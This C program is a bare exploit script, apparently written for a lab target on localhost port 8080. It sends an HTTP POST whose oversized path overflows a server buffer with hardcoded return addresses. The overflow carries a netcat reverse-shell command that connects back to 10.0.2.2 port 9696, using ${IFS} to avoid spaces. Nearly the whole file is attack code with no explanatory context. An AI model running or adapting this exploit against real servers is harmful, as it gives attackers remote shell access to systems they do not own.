#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define HOST "127.0.0.1"
#define PORT 8080
#define OVERFLOW_LEN 172

int main() {
    int sock;
    struct sockaddr_in server;
    char request[1024];
    char path[512];
    
    memset(path, 'A', OVERFLOW_LEN - 32);
    memcpy(path + (OVERFLOW_LEN - 32), "\x00\x7f\xff\xdb\xe0", 4);
    memset(path + (OVERFLOW_LEN - 28), 'B', 28);
    memcpy(path + OVERFLOW_LEN, "\x77\xf6\x97\xa0", 4);
    memcpy(path + OVERFLOW_LEN + 4, "\x00\x7f\xff\xdb\xf4", 4);
    memset(path + OVERFLOW_LEN + 12, 'C', 8);
    memcpy(path + OVERFLOW_LEN + 20, "\x77\xfa\xe4\x24", 4);
    memset(path + OVERFLOW_LEN + 24, 'C', 4);

    // payload here /shrug
    const char *shell = "rm${IFS}/tmp/p;mkfifo${IFS}/tmp/p;nc${IFS}10.0.2.2${IFS}9696</tmp/p|/bin/sh>/tmp/p";
    memcpy(path + OVERFLOW_LEN + 28, shell, strlen(shell));
    
    path[OVERFLOW_LEN + 28 + strlen(shell)] = '\0';
    
    snprintf(request, sizeof(request),
             "POST %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Content-Length: 1000\r\n\r\n",
             path, HOST);
    
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return 1;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    inet_pton(AF_INET, HOST, &server.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        perror("connect");
        close(sock);
        return 1;
    }
    
    send(sock, request, strlen(request), 0);
    shutdown(sock, SHUT_WR);
    
    printf("Length: %zu\n", strlen(path));
    
    close(sock);
    return 0;
}